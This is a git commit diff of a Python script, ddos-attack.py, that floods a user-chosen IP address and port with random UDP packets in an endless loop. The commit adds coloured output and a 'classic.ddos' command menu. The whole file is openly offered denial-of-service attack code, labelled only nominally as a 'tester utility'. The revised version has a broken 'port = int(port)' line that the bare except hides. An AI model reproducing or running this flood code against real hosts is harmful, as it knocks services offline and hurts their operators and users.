a3503771de4cbb68c86bc181892339614c71fcd4
srgwrtg0342 <99070713+srgwrtg0342@users.noreply.github.com>
2022-02-28 07:45:30 +0200

    Add files via upload

--- ddos-attack.py
+++ ddos-attack.py
@@ -1,4 +1,6 @@
-import os, time, socket, random
+import os, time, socket, random, colorama
+from colorama import Fore, Back, Style
+colorama.init()
 
 class Init():
   def __init__(self):
@@ -7,42 +9,60 @@ class Init():
 
       self.loading()
 
-      sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-      print(" \n" + "         ██████╗ ██████╗  █████╗  ██████╗      ██╗   ██╗████████╗██╗██╗      \n" + "         ██╔══██╗██╔══██╗██╔══██╗██╔════╝      ██║   ██║╚══██╔══╝██║██║      \n" + "         ██║  ██║██║  ██║██║  ██║╚█████╗ █████╗██║   ██║   ██║   ██║██║      \n" + "         ██║  ██║██║  ██║██║  ██║ ╚═══██╗╚════╝██║   ██║   ██║   ██║██║     \n"+  "         ██████╔╝██████╔╝╚█████╔╝██████╔╝      ╚██████╔╝   ██║   ██║███████╗ \n" + "         ╚═════╝ ╚═════╝  ╚════╝ ╚═════╝        ╚═════╝    ╚═╝   ╚═╝╚══════╝ \n" + "\n" + "                        DDOS-UTILITY -- BY SRGWRTG0342\n" + "                              A TESTER UTILITY\n" )
-      ip = input("IP : ")
-      port = input("PORT : ")
-      numbytes = input("PACKET SIZE(bytes):")
-      numbytes = int(numbytes)
-      if numbytes != int(numbytes):
-        print("Error!")
-
-      bytes = random._urandom(int(numbytes))
-      port = int(port)
-
-      os.system('cls' if os.name == 'nt' else 'clear')
-      time.sleep(3)
-      sent = 0
-      while True:
-          sock.sendto(bytes, (ip,port))
-          sent = sent + 1
-          print ("Send %s packets %s to port:%s"%(sent,ip,port))
+      self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      print(" \n" + Fore.LIGHTRED_EX + " ██████╗ ██████╗  █████╗  ██████╗      ██╗   ██╗████████╗██╗██╗      \n" + " ██╔══██╗██╔══██╗██╔══██╗██╔════╝      ██║   ██║╚══██╔══╝██║██║      \n" + " ██║  ██║██║  ██║██║  ██║╚█████╗ █████╗██║   ██║   ██║   ██║██║      \n" + " ██║  ██║██║  ██║██║  ██║ ╚═══██╗╚════╝██║   ██║   ██║   ██║██║     \n"+  " ██████╔╝██████╔╝╚█████╔╝██████╔╝      ╚██████╔╝   ██║   ██║███████╗ \n" + " ╚═════╝ ╚═════╝  ╚════╝ ╚═════╝        ╚═════╝    ╚═╝   ╚═╝╚══════╝ \n" + Fore.LIGHTRED_EX + "\n" + "        DDOS-UTILITY -- BY SRGWRTG0342\n" + "        A TESTER UTILITY\n" )
+      
+      self.commandline()
+      
     except:
       print("Exit!")
+  def commandline(self):
+    try:
+      while True:
+        commandline = input(Fore.LIGHTRED_EX + "     \'help\' - For help menu >>>" + Fore.LIGHTYELLOW_EX + " ")
 
+        if commandline == "help":
+          print(Fore.LIGHTYELLOW_EX + "\n         Commands: \n" + "           classic.ddos - Classic method script\n")
+
+        if commandline == "classic.ddos":
+
+          print(Fore.LIGHTYELLOW_EX + "\n      DDOS UTILITY" + " Starter")
+          self.ip = input( Fore.LIGHTYELLOW_EX + "\n     IP >>> ")
+          self.port = input( Fore.LIGHTYELLOW_EX + "     PORT >>> ")
+          numbytes = input( Fore.LIGHTYELLOW_EX + "     PACKET SIZE(bytes) >>>")
+          numbytes = int(numbytes)
+
+          if numbytes != int(numbytes):
+            print("Error!")
+
+          bytes = random._urandom(int(numbytes))
+          port = int(port)
+
+          os.system('cls' if os.name == 'nt' else 'clear')
+          time.sleep(3)
+          sent = 0
+
+          while True:
+            self.sock.sendto(bytes, (self.ip,self.port))
+            sent = sent + 1
+            print ("Send %s packets %s to port:%s"%(sent,self.ip,self.port))
+    except:
+      print("Exit!")
   def loading(self):
-    ttt = "LOAD - █"
-    tpt = "█"
+    ttt = Fore.LIGHTRED_EX + "LOADING - █"
+    tpt = Fore.LIGHTRED_EX + "█"
     ztp = ""
     ttt = str(ttt)
     tpt = str(tpt)
     ztp = str(ztp)
-    ttt = "LOADING - █"
+    ttt = Fore.LIGHTRED_EX + "LOADING - █"
     ttt = str(ttt)
-    for i in range(10):
-      time.sleep(0.05)
+    for i in range(20):
+      time.sleep(0.005)
       os.system('cls' if os.name == 'nt' else 'clear')
       ttt += tpt
       print(ttt)
-      time.sleep(0.05)
+      time.sleep(0.005)
       os.system('cls' if os.name == 'nt' else 'clear')
+
 Init()
